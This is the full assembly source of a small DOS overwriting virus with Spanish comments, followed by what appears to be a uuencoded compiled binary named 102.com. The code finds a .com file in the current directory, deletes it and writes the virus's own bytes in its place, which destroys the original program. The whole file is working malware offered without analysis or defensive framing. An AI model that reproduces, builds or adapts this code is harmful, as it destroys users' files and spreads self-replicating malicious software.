; Virus Anti Novi Overwriting non resident

codigo  segment byte public
        assume  cs:codigo, ds:codigo

        org     100h

vmini   proc    far


start:
        mov     ah,1Ah
        mov     dx,offset dta
        int     21h              ;pongo DTA en dta

        mov     ah,4Eh
        mov     dx,offset nombre
        mov     cx,26h
        int     21h       ; DOS Services  ah=function 4Eh
                          ;  find 1st filename match @ds:dx

        jc  short adios   ; Jump if carry Set

        mov     ah,41h
        mov     dx,offset dta + 1eh
        int     21h                  ; borro el archivo .com


        mov     ah,3Ch
        mov     cx,0
        mov     dx,offset dta + 1eh
        int     21h       ;
                          ;  create file, cx=attributos, name@ds:dx

        jc  short adios   ; Jump if carry Set

        mov     cx, offset fin - 100h
        mov     dx,100h
        xchg    ax,bx     ; BX = Handle
        mov     ah,40h
        int     21h       ; DOS Services  ah=function 40h
                          ;  write file cx=bytes, from ds:dx

adios:
        mov     ah,4Ch    ; Terminar el programa con close files
        int     21h

dta:           db 43 dup (0)

nombre:        db      '*.com', 0

fin:
vmini   endp

codigo  ends

        end     start
begin 775 102.com
MM!JZ-0'-(;1.NF`!N28`S2%R'K1!NE,!S2&T/+D``+I3`<@NY9@"Z``&3
MM$#-(;1,S2$`````````````````````````````````````````````````
,````````*BYC;VT`
`
end
